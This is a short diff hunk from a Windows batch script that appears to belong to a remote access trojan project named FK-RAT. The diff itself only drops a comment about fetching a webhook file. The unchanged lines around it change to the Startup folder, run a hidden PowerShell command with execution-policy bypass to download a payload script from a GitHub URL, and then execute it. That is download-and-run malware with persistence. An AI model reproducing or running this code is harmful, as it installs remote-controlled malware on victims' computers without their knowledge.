@@ -13,9 +13,6 @@ cd "%STARTUP%"
 @REM write payloads to startup
 powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 
 
-@REM get Webhookfile
-
-
 @REM run payload
 powershell ./wget.cmd
 
